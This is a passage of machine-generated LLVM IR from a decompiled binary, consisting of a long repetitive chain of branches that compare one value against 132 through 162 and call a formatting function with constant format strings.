  br label %dec_label_pc_804baff

dec_label_pc_804baff:                             ; preds = %dec_label_pc_804bac6, %dec_label_pc_804bacf
  %v13_804baff = icmp eq i32 %v2_8049efa, 132
  %v1_804bb06 = icmp eq i1 %v13_804baff, false
  br i1 %v1_804bb06, label %dec_label_pc_804bb38, label %dec_label_pc_804bb08

dec_label_pc_804bb08:                             ; preds = %dec_label_pc_804baff
  %v0_804bb08 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bb08 = zext i8 %v0_804bb08 to i32
  store i32 %v1_804bb08, i32* @edx, align 4
  %v0_804bb12 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bb12 = zext i8 %v0_804bb12 to i32
  %v2_804bb21 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb21, i32* @ebx, align 4
  %v4_804bb33 = call i32 @szprintf(i32 %v2_804bb21, i32 ptrtoint ([14 x i8]* @global_var_8058ae4.166 to i32), i32 %v1_804bb12)
  br label %dec_label_pc_804bb38

dec_label_pc_804bb38:                             ; preds = %dec_label_pc_804baff, %dec_label_pc_804bb08
  %v13_804bb38 = icmp eq i32 %v2_8049efa, 133
  %v1_804bb3f = icmp eq i1 %v13_804bb38, false
  br i1 %v1_804bb3f, label %dec_label_pc_804bb71, label %dec_label_pc_804bb41

dec_label_pc_804bb41:                             ; preds = %dec_label_pc_804bb38
  %v0_804bb41 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bb41 = zext i8 %v0_804bb41 to i32
  store i32 %v1_804bb41, i32* @edx, align 4
  %v0_804bb4b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bb4b = zext i8 %v0_804bb4b to i32
  %v2_804bb5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb5a, i32* @ebx, align 4
  %v4_804bb6c = call i32 @szprintf(i32 %v2_804bb5a, i32 ptrtoint ([14 x i8]* @global_var_8058af2.167 to i32), i32 %v1_804bb4b)
  br label %dec_label_pc_804bb71

dec_label_pc_804bb71:                             ; preds = %dec_label_pc_804bb38, %dec_label_pc_804bb41
  %v13_804bb71 = icmp eq i32 %v2_8049efa, 134
  %v1_804bb78 = icmp eq i1 %v13_804bb71, false
  br i1 %v1_804bb78, label %dec_label_pc_804bbaa, label %dec_label_pc_804bb7a

dec_label_pc_804bb7a:                             ; preds = %dec_label_pc_804bb71
  %v0_804bb7a = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bb7a = zext i8 %v0_804bb7a to i32
  store i32 %v1_804bb7a, i32* @edx, align 4
  %v0_804bb84 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bb84 = zext i8 %v0_804bb84 to i32
  %v2_804bb93 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb93, i32* @ebx, align 4
  %v4_804bba5 = call i32 @szprintf(i32 %v2_804bb93, i32 ptrtoint ([14 x i8]* @global_var_8058b00.168 to i32), i32 %v1_804bb84)
  br label %dec_label_pc_804bbaa

dec_label_pc_804bbaa:                             ; preds = %dec_label_pc_804bb71, %dec_label_pc_804bb7a
  %v13_804bbaa = icmp eq i32 %v2_8049efa, 135
  %v1_804bbb1 = icmp eq i1 %v13_804bbaa, false
  br i1 %v1_804bbb1, label %dec_label_pc_804bbe3, label %dec_label_pc_804bbb3

dec_label_pc_804bbb3:                             ; preds = %dec_label_pc_804bbaa
  %v0_804bbb3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bbb3 = zext i8 %v0_804bbb3 to i32
  store i32 %v1_804bbb3, i32* @edx, align 4
  %v0_804bbbd = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bbbd = zext i8 %v0_804bbbd to i32
  %v2_804bbcc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbcc, i32* @ebx, align 4
  %v4_804bbde = call i32 @szprintf(i32 %v2_804bbcc, i32 ptrtoint ([14 x i8]* @global_var_8058b0e.169 to i32), i32 %v1_804bbbd)
  br label %dec_label_pc_804bbe3

dec_label_pc_804bbe3:                             ; preds = %dec_label_pc_804bbaa, %dec_label_pc_804bbb3
  %v13_804bbe3 = icmp eq i32 %v2_8049efa, 136
  %v1_804bbea = icmp eq i1 %v13_804bbe3, false
  br i1 %v1_804bbea, label %dec_label_pc_804bc1c, label %dec_label_pc_804bbec

dec_label_pc_804bbec:                             ; preds = %dec_label_pc_804bbe3
  %v0_804bbec = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bbec = zext i8 %v0_804bbec to i32
  store i32 %v1_804bbec, i32* @edx, align 4
  %v0_804bbf6 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bbf6 = zext i8 %v0_804bbf6 to i32
  %v2_804bc05 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc05, i32* @ebx, align 4
  %v4_804bc17 = call i32 @szprintf(i32 %v2_804bc05, i32 ptrtoint ([14 x i8]* @global_var_8058b1c.170 to i32), i32 %v1_804bbf6)
  br label %dec_label_pc_804bc1c

dec_label_pc_804bc1c:                             ; preds = %dec_label_pc_804bbe3, %dec_label_pc_804bbec
  %v13_804bc1c = icmp eq i32 %v2_8049efa, 137
  %v1_804bc23 = icmp eq i1 %v13_804bc1c, false
  br i1 %v1_804bc23, label %dec_label_pc_804bc55, label %dec_label_pc_804bc25

dec_label_pc_804bc25:                             ; preds = %dec_label_pc_804bc1c
  %v0_804bc25 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bc25 = zext i8 %v0_804bc25 to i32
  store i32 %v1_804bc25, i32* @edx, align 4
  %v0_804bc2f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bc2f = zext i8 %v0_804bc2f to i32
  %v2_804bc3e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc3e, i32* @ebx, align 4
  %v4_804bc50 = call i32 @szprintf(i32 %v2_804bc3e, i32 ptrtoint ([13 x i8]* @global_var_8058b2a.171 to i32), i32 %v1_804bc2f)
  br label %dec_label_pc_804bc55

dec_label_pc_804bc55:                             ; preds = %dec_label_pc_804bc1c, %dec_label_pc_804bc25
  %v13_804bc55 = icmp eq i32 %v2_8049efa, 138
  %v1_804bc5c = icmp eq i1 %v13_804bc55, false
  br i1 %v1_804bc5c, label %dec_label_pc_804bc8e, label %dec_label_pc_804bc5e

dec_label_pc_804bc5e:                             ; preds = %dec_label_pc_804bc55
  %v0_804bc5e = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bc5e = zext i8 %v0_804bc5e to i32
  store i32 %v1_804bc5e, i32* @edx, align 4
  %v0_804bc68 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bc68 = zext i8 %v0_804bc68 to i32
  %v2_804bc77 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc77, i32* @ebx, align 4
  %v4_804bc89 = call i32 @szprintf(i32 %v2_804bc77, i32 ptrtoint ([13 x i8]* @global_var_8058b37.172 to i32), i32 %v1_804bc68)
  br label %dec_label_pc_804bc8e

dec_label_pc_804bc8e:                             ; preds = %dec_label_pc_804bc55, %dec_label_pc_804bc5e
  %v13_804bc8e = icmp eq i32 %v2_8049efa, 139
  %v1_804bc95 = icmp eq i1 %v13_804bc8e, false
  br i1 %v1_804bc95, label %dec_label_pc_804bcc7, label %dec_label_pc_804bc97

dec_label_pc_804bc97:                             ; preds = %dec_label_pc_804bc8e
  %v0_804bc97 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bc97 = zext i8 %v0_804bc97 to i32
  store i32 %v1_804bc97, i32* @edx, align 4
  %v0_804bca1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bca1 = zext i8 %v0_804bca1 to i32
  %v2_804bcb0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcb0, i32* @ebx, align 4
  %v4_804bcc2 = call i32 @szprintf(i32 %v2_804bcb0, i32 ptrtoint ([13 x i8]* @global_var_8058b44.173 to i32), i32 %v1_804bca1)
  br label %dec_label_pc_804bcc7

dec_label_pc_804bcc7:                             ; preds = %dec_label_pc_804bc8e, %dec_label_pc_804bc97
  %v13_804bcc7 = icmp eq i32 %v2_8049efa, 140
  %v1_804bcce = icmp eq i1 %v13_804bcc7, false
  br i1 %v1_804bcce, label %dec_label_pc_804bd00, label %dec_label_pc_804bcd0

dec_label_pc_804bcd0:                             ; preds = %dec_label_pc_804bcc7
  %v0_804bcd0 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bcd0 = zext i8 %v0_804bcd0 to i32
  store i32 %v1_804bcd0, i32* @edx, align 4
  %v0_804bcda = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bcda = zext i8 %v0_804bcda to i32
  %v2_804bce9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bce9, i32* @ebx, align 4
  %v4_804bcfb = call i32 @szprintf(i32 %v2_804bce9, i32 ptrtoint ([13 x i8]* @global_var_8058b51.174 to i32), i32 %v1_804bcda)
  br label %dec_label_pc_804bd00

dec_label_pc_804bd00:                             ; preds = %dec_label_pc_804bcc7, %dec_label_pc_804bcd0
  %v13_804bd00 = icmp eq i32 %v2_8049efa, 141
  %v1_804bd07 = icmp eq i1 %v13_804bd00, false
  br i1 %v1_804bd07, label %dec_label_pc_804bd39, label %dec_label_pc_804bd09

dec_label_pc_804bd09:                             ; preds = %dec_label_pc_804bd00
  %v0_804bd09 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bd09 = zext i8 %v0_804bd09 to i32
  store i32 %v1_804bd09, i32* @edx, align 4
  %v0_804bd13 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bd13 = zext i8 %v0_804bd13 to i32
  %v2_804bd22 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd22, i32* @ebx, align 4
  %v4_804bd34 = call i32 @szprintf(i32 %v2_804bd22, i32 ptrtoint ([13 x i8]* @global_var_8058b5e.175 to i32), i32 %v1_804bd13)
  br label %dec_label_pc_804bd39

dec_label_pc_804bd39:                             ; preds = %dec_label_pc_804bd00, %dec_label_pc_804bd09
  %v13_804bd39 = icmp eq i32 %v2_8049efa, 142
  %v1_804bd40 = icmp eq i1 %v13_804bd39, false
  br i1 %v1_804bd40, label %dec_label_pc_804bd72, label %dec_label_pc_804bd42

dec_label_pc_804bd42:                             ; preds = %dec_label_pc_804bd39
  %v0_804bd42 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bd42 = zext i8 %v0_804bd42 to i32
  store i32 %v1_804bd42, i32* @edx, align 4
  %v0_804bd4c = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bd4c = zext i8 %v0_804bd4c to i32
  %v2_804bd5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd5b, i32* @ebx, align 4
  %v4_804bd6d = call i32 @szprintf(i32 %v2_804bd5b, i32 ptrtoint ([13 x i8]* @global_var_8058b6b.176 to i32), i32 %v1_804bd4c)
  br label %dec_label_pc_804bd72

dec_label_pc_804bd72:                             ; preds = %dec_label_pc_804bd39, %dec_label_pc_804bd42
  %v13_804bd72 = icmp eq i32 %v2_8049efa, 143
  %v1_804bd79 = icmp eq i1 %v13_804bd72, false
  br i1 %v1_804bd79, label %dec_label_pc_804bdab, label %dec_label_pc_804bd7b

dec_label_pc_804bd7b:                             ; preds = %dec_label_pc_804bd72
  %v0_804bd7b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bd7b = zext i8 %v0_804bd7b to i32
  store i32 %v1_804bd7b, i32* @edx, align 4
  %v0_804bd85 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bd85 = zext i8 %v0_804bd85 to i32
  %v2_804bd94 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd94, i32* @ebx, align 4
  %v4_804bda6 = call i32 @szprintf(i32 %v2_804bd94, i32 ptrtoint ([14 x i8]* @global_var_8058a82.159 to i32), i32 %v1_804bd85)
  br label %dec_label_pc_804bdab

dec_label_pc_804bdab:                             ; preds = %dec_label_pc_804bd72, %dec_label_pc_804bd7b
  %v10_804bdab = icmp eq i32 %v2_8049efa, 144
  %v1_804bdb2 = icmp eq i1 %v10_804bdab, false
  br i1 %v1_804bdb2, label %dec_label_pc_804bde4, label %dec_label_pc_804bdb4

dec_label_pc_804bdb4:                             ; preds = %dec_label_pc_804bdab
  %v0_804bdb4 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bdb4 = zext i8 %v0_804bdb4 to i32
  store i32 %v1_804bdb4, i32* @edx, align 4
  %v0_804bdbe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bdbe = zext i8 %v0_804bdbe to i32
  %v2_804bdcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdcd, i32* @ebx, align 4
  %v4_804bddf = call i32 @szprintf(i32 %v2_804bdcd, i32 ptrtoint ([14 x i8]* @global_var_8058b78.177 to i32), i32 %v1_804bdbe)
  br label %dec_label_pc_804bde4

dec_label_pc_804bde4:                             ; preds = %dec_label_pc_804bdab, %dec_label_pc_804bdb4
  %v13_804bde4 = icmp eq i32 %v2_8049efa, 145
  %v1_804bdeb = icmp eq i1 %v13_804bde4, false
  br i1 %v1_804bdeb, label %dec_label_pc_804be1d, label %dec_label_pc_804bded

dec_label_pc_804bded:                             ; preds = %dec_label_pc_804bde4
  %v0_804bded = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bded = zext i8 %v0_804bded to i32
  store i32 %v1_804bded, i32* @edx, align 4
  %v0_804bdf7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bdf7 = zext i8 %v0_804bdf7 to i32
  %v2_804be06 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be06, i32* @ebx, align 4
  %v4_804be18 = call i32 @szprintf(i32 %v2_804be06, i32 ptrtoint ([14 x i8]* @global_var_8058b86.178 to i32), i32 %v1_804bdf7)
  br label %dec_label_pc_804be1d

dec_label_pc_804be1d:                             ; preds = %dec_label_pc_804bde4, %dec_label_pc_804bded
  %v13_804be1d = icmp eq i32 %v2_8049efa, 146
  %v1_804be24 = icmp eq i1 %v13_804be1d, false
  br i1 %v1_804be24, label %dec_label_pc_804be56, label %dec_label_pc_804be26

dec_label_pc_804be26:                             ; preds = %dec_label_pc_804be1d
  %v0_804be26 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804be26 = zext i8 %v0_804be26 to i32
  store i32 %v1_804be26, i32* @edx, align 4
  %v0_804be30 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804be30 = zext i8 %v0_804be30 to i32
  %v2_804be3f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be3f, i32* @ebx, align 4
  %v4_804be51 = call i32 @szprintf(i32 %v2_804be3f, i32 ptrtoint ([14 x i8]* @global_var_8058b94.179 to i32), i32 %v1_804be30)
  br label %dec_label_pc_804be56

dec_label_pc_804be56:                             ; preds = %dec_label_pc_804be1d, %dec_label_pc_804be26
  %v13_804be56 = icmp eq i32 %v2_8049efa, 147
  %v1_804be5d = icmp eq i1 %v13_804be56, false
  br i1 %v1_804be5d, label %dec_label_pc_804be8f, label %dec_label_pc_804be5f

dec_label_pc_804be5f:                             ; preds = %dec_label_pc_804be56
  %v0_804be5f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804be5f = zext i8 %v0_804be5f to i32
  store i32 %v1_804be5f, i32* @edx, align 4
  %v0_804be69 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804be69 = zext i8 %v0_804be69 to i32
  %v2_804be78 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be78, i32* @ebx, align 4
  %v4_804be8a = call i32 @szprintf(i32 %v2_804be78, i32 ptrtoint ([13 x i8]* @global_var_8058ba2.180 to i32), i32 %v1_804be69)
  br label %dec_label_pc_804be8f

dec_label_pc_804be8f:                             ; preds = %dec_label_pc_804be56, %dec_label_pc_804be5f
  %v13_804be8f = icmp eq i32 %v2_8049efa, 148
  %v1_804be96 = icmp eq i1 %v13_804be8f, false
  br i1 %v1_804be96, label %dec_label_pc_804bec8, label %dec_label_pc_804be98

dec_label_pc_804be98:                             ; preds = %dec_label_pc_804be8f
  %v0_804be98 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804be98 = zext i8 %v0_804be98 to i32
  store i32 %v1_804be98, i32* @edx, align 4
  %v0_804bea2 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bea2 = zext i8 %v0_804bea2 to i32
  %v2_804beb1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804beb1, i32* @ebx, align 4
  %v4_804bec3 = call i32 @szprintf(i32 %v2_804beb1, i32 ptrtoint ([14 x i8]* @global_var_8058baf.181 to i32), i32 %v1_804bea2)
  br label %dec_label_pc_804bec8

dec_label_pc_804bec8:                             ; preds = %dec_label_pc_804be8f, %dec_label_pc_804be98
  %v13_804bec8 = icmp eq i32 %v2_8049efa, 149
  %v1_804becf = icmp eq i1 %v13_804bec8, false
  br i1 %v1_804becf, label %dec_label_pc_804bf01, label %dec_label_pc_804bed1

dec_label_pc_804bed1:                             ; preds = %dec_label_pc_804bec8
  %v0_804bed1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bed1 = zext i8 %v0_804bed1 to i32
  store i32 %v1_804bed1, i32* @edx, align 4
  %v0_804bedb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bedb = zext i8 %v0_804bedb to i32
  %v2_804beea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804beea, i32* @ebx, align 4
  %v4_804befc = call i32 @szprintf(i32 %v2_804beea, i32 ptrtoint ([14 x i8]* @global_var_8058bbd.182 to i32), i32 %v1_804bedb)
  br label %dec_label_pc_804bf01

dec_label_pc_804bf01:                             ; preds = %dec_label_pc_804bec8, %dec_label_pc_804bed1
  %v13_804bf01 = icmp eq i32 %v2_8049efa, 150
  %v1_804bf08 = icmp eq i1 %v13_804bf01, false
  br i1 %v1_804bf08, label %dec_label_pc_804bf3a, label %dec_label_pc_804bf0a

dec_label_pc_804bf0a:                             ; preds = %dec_label_pc_804bf01
  %v0_804bf0a = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bf0a = zext i8 %v0_804bf0a to i32
  store i32 %v1_804bf0a, i32* @edx, align 4
  %v0_804bf14 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bf14 = zext i8 %v0_804bf14 to i32
  %v2_804bf23 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf23, i32* @ebx, align 4
  %v4_804bf35 = call i32 @szprintf(i32 %v2_804bf23, i32 ptrtoint ([14 x i8]* @global_var_8058bcb.183 to i32), i32 %v1_804bf14)
  br label %dec_label_pc_804bf3a

dec_label_pc_804bf3a:                             ; preds = %dec_label_pc_804bf01, %dec_label_pc_804bf0a
  %v13_804bf3a = icmp eq i32 %v2_8049efa, 151
  %v1_804bf41 = icmp eq i1 %v13_804bf3a, false
  br i1 %v1_804bf41, label %dec_label_pc_804bf73, label %dec_label_pc_804bf43

dec_label_pc_804bf43:                             ; preds = %dec_label_pc_804bf3a
  %v0_804bf43 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bf43 = zext i8 %v0_804bf43 to i32
  store i32 %v1_804bf43, i32* @edx, align 4
  %v0_804bf4d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bf4d = zext i8 %v0_804bf4d to i32
  %v2_804bf5c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf5c, i32* @ebx, align 4
  %v4_804bf6e = call i32 @szprintf(i32 %v2_804bf5c, i32 ptrtoint ([14 x i8]* @global_var_8058bd9.184 to i32), i32 %v1_804bf4d)
  br label %dec_label_pc_804bf73

dec_label_pc_804bf73:                             ; preds = %dec_label_pc_804bf3a, %dec_label_pc_804bf43
  %v13_804bf73 = icmp eq i32 %v2_8049efa, 152
  %v1_804bf7a = icmp eq i1 %v13_804bf73, false
  br i1 %v1_804bf7a, label %dec_label_pc_804bfac, label %dec_label_pc_804bf7c

dec_label_pc_804bf7c:                             ; preds = %dec_label_pc_804bf73
  %v0_804bf7c = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bf7c = zext i8 %v0_804bf7c to i32
  store i32 %v1_804bf7c, i32* @edx, align 4
  %v0_804bf86 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bf86 = zext i8 %v0_804bf86 to i32
  %v2_804bf95 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf95, i32* @ebx, align 4
  %v4_804bfa7 = call i32 @szprintf(i32 %v2_804bf95, i32 ptrtoint ([14 x i8]* @global_var_8058a07.150 to i32), i32 %v1_804bf86)
  br label %dec_label_pc_804bfac

dec_label_pc_804bfac:                             ; preds = %dec_label_pc_804bf73, %dec_label_pc_804bf7c
  %v13_804bfac = icmp eq i32 %v2_8049efa, 153
  %v1_804bfb3 = icmp eq i1 %v13_804bfac, false
  br i1 %v1_804bfb3, label %dec_label_pc_804bfe5, label %dec_label_pc_804bfb5

dec_label_pc_804bfb5:                             ; preds = %dec_label_pc_804bfac
  %v0_804bfb5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bfb5 = zext i8 %v0_804bfb5 to i32
  store i32 %v1_804bfb5, i32* @edx, align 4
  %v0_804bfbf = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bfbf = zext i8 %v0_804bfbf to i32
  %v2_804bfce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfce, i32* @ebx, align 4
  %v4_804bfe0 = call i32 @szprintf(i32 %v2_804bfce, i32 ptrtoint ([13 x i8]* @global_var_8058be7.185 to i32), i32 %v1_804bfbf)
  br label %dec_label_pc_804bfe5

dec_label_pc_804bfe5:                             ; preds = %dec_label_pc_804bfac, %dec_label_pc_804bfb5
  %v13_804bfe5 = icmp eq i32 %v2_8049efa, 154
  %v1_804bfec = icmp eq i1 %v13_804bfe5, false
  br i1 %v1_804bfec, label %dec_label_pc_804c01e, label %dec_label_pc_804bfee

dec_label_pc_804bfee:                             ; preds = %dec_label_pc_804bfe5
  %v0_804bfee = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bfee = zext i8 %v0_804bfee to i32
  store i32 %v1_804bfee, i32* @edx, align 4
  %v0_804bff8 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bff8 = zext i8 %v0_804bff8 to i32
  %v2_804c007 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c007, i32* @ebx, align 4
  %v4_804c019 = call i32 @szprintf(i32 %v2_804c007, i32 ptrtoint ([13 x i8]* @global_var_8058bf4.186 to i32), i32 %v1_804bff8)
  br label %dec_label_pc_804c01e

dec_label_pc_804c01e:                             ; preds = %dec_label_pc_804bfe5, %dec_label_pc_804bfee
  %v13_804c01e = icmp eq i32 %v2_8049efa, 155
  %v1_804c025 = icmp eq i1 %v13_804c01e, false
  br i1 %v1_804c025, label %dec_label_pc_804c057, label %dec_label_pc_804c027

dec_label_pc_804c027:                             ; preds = %dec_label_pc_804c01e
  %v0_804c027 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c027 = zext i8 %v0_804c027 to i32
  store i32 %v1_804c027, i32* @edx, align 4
  %v0_804c031 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c031 = zext i8 %v0_804c031 to i32
  %v2_804c040 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c040, i32* @ebx, align 4
  %v4_804c052 = call i32 @szprintf(i32 %v2_804c040, i32 ptrtoint ([13 x i8]* @global_var_8058c01.187 to i32), i32 %v1_804c031)
  br label %dec_label_pc_804c057

dec_label_pc_804c057:                             ; preds = %dec_label_pc_804c01e, %dec_label_pc_804c027
  %v13_804c057 = icmp eq i32 %v2_8049efa, 156
  %v1_804c05e = icmp eq i1 %v13_804c057, false
  br i1 %v1_804c05e, label %dec_label_pc_804c090, label %dec_label_pc_804c060

dec_label_pc_804c060:                             ; preds = %dec_label_pc_804c057
  %v0_804c060 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c060 = zext i8 %v0_804c060 to i32
  store i32 %v1_804c060, i32* @edx, align 4
  %v0_804c06a = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c06a = zext i8 %v0_804c06a to i32
  %v2_804c079 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c079, i32* @ebx, align 4
  %v4_804c08b = call i32 @szprintf(i32 %v2_804c079, i32 ptrtoint ([13 x i8]* @global_var_8058c0e.188 to i32), i32 %v1_804c06a)
  br label %dec_label_pc_804c090

dec_label_pc_804c090:                             ; preds = %dec_label_pc_804c057, %dec_label_pc_804c060
  %v13_804c090 = icmp eq i32 %v2_8049efa, 157
  %v1_804c097 = icmp eq i1 %v13_804c090, false
  br i1 %v1_804c097, label %dec_label_pc_804c0c9, label %dec_label_pc_804c099

dec_label_pc_804c099:                             ; preds = %dec_label_pc_804c090
  %v0_804c099 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c099 = zext i8 %v0_804c099 to i32
  store i32 %v1_804c099, i32* @edx, align 4
  %v0_804c0a3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c0a3 = zext i8 %v0_804c0a3 to i32
  %v2_804c0b2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0b2, i32* @ebx, align 4
  %v4_804c0c4 = call i32 @szprintf(i32 %v2_804c0b2, i32 ptrtoint ([14 x i8]* @global_var_8058c1b.189 to i32), i32 %v1_804c0a3)
  br label %dec_label_pc_804c0c9

dec_label_pc_804c0c9:                             ; preds = %dec_label_pc_804c090, %dec_label_pc_804c099
  %v13_804c0c9 = icmp eq i32 %v2_8049efa, 158
  %v1_804c0d0 = icmp eq i1 %v13_804c0c9, false
  br i1 %v1_804c0d0, label %dec_label_pc_804c102, label %dec_label_pc_804c0d2

dec_label_pc_804c0d2:                             ; preds = %dec_label_pc_804c0c9
  %v0_804c0d2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c0d2 = zext i8 %v0_804c0d2 to i32
  store i32 %v1_804c0d2, i32* @edx, align 4
  %v0_804c0dc = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c0dc = zext i8 %v0_804c0dc to i32
  %v2_804c0eb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0eb, i32* @ebx, align 4
  %v4_804c0fd = call i32 @szprintf(i32 %v2_804c0eb, i32 ptrtoint ([12 x i8]* @global_var_8058c29.190 to i32), i32 %v1_804c0dc)
  br label %dec_label_pc_804c102

dec_label_pc_804c102:                             ; preds = %dec_label_pc_804c0c9, %dec_label_pc_804c0d2
  %v13_804c102 = icmp eq i32 %v2_8049efa, 159
  %v1_804c109 = icmp eq i1 %v13_804c102, false
  br i1 %v1_804c109, label %dec_label_pc_804c13b, label %dec_label_pc_804c10b

dec_label_pc_804c10b:                             ; preds = %dec_label_pc_804c102
  %v0_804c10b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c10b = zext i8 %v0_804c10b to i32
  store i32 %v1_804c10b, i32* @edx, align 4
  %v0_804c115 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c115 = zext i8 %v0_804c115 to i32
  %v2_804c124 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c124, i32* @ebx, align 4
  %v4_804c136 = call i32 @szprintf(i32 %v2_804c124, i32 ptrtoint ([14 x i8]* @global_var_8058c35.191 to i32), i32 %v1_804c115)
  br label %dec_label_pc_804c13b

dec_label_pc_804c13b:                             ; preds = %dec_label_pc_804c102, %dec_label_pc_804c10b
  %v10_804c13b = icmp eq i32 %v2_8049efa, 160
  %v1_804c142 = icmp eq i1 %v10_804c13b, false
  br i1 %v1_804c142, label %dec_label_pc_804c174, label %dec_label_pc_804c144

dec_label_pc_804c144:                             ; preds = %dec_label_pc_804c13b
  %v0_804c144 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c144 = zext i8 %v0_804c144 to i32
  store i32 %v1_804c144, i32* @edx, align 4
  %v0_804c14e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c14e = zext i8 %v0_804c14e to i32
  %v2_804c15d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c15d, i32* @ebx, align 4
  %v4_804c16f = call i32 @szprintf(i32 %v2_804c15d, i32 ptrtoint ([13 x i8]* @global_var_8058c43.192 to i32), i32 %v1_804c14e)
  br label %dec_label_pc_804c174

dec_label_pc_804c174:                             ; preds = %dec_label_pc_804c13b, %dec_label_pc_804c144
  %v13_804c174 = icmp eq i32 %v2_8049efa, 161
  %v1_804c17b = icmp eq i1 %v13_804c174, false
  br i1 %v1_804c17b, label %dec_label_pc_804c1ad, label %dec_label_pc_804c17d

dec_label_pc_804c17d:                             ; preds = %dec_label_pc_804c174
  %v0_804c17d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c17d = zext i8 %v0_804c17d to i32
  store i32 %v1_804c17d, i32* @edx, align 4
  %v0_804c187 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c187 = zext i8 %v0_804c187 to i32
  %v2_804c196 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c196, i32* @ebx, align 4
  %v4_804c1a8 = call i32 @szprintf(i32 %v2_804c196, i32 ptrtoint ([14 x i8]* @global_var_8058c50.193 to i32), i32 %v1_804c187)
  br label %dec_label_pc_804c1ad

dec_label_pc_804c1ad:                             ; preds = %dec_label_pc_804c174, %dec_label_pc_804c17d
  %v13_804c1ad = icmp eq i32 %v2_8049efa, 162
  %v1_804c1b4 = icmp eq i1 %v13_804c1ad, false
  br i1 %v1_804c1b4, label %dec_label_pc_804c1e6, label %dec_label_pc_804c1b6

dec_label_pc_804c1b6:                             ; preds = %dec_label_pc_804c1ad
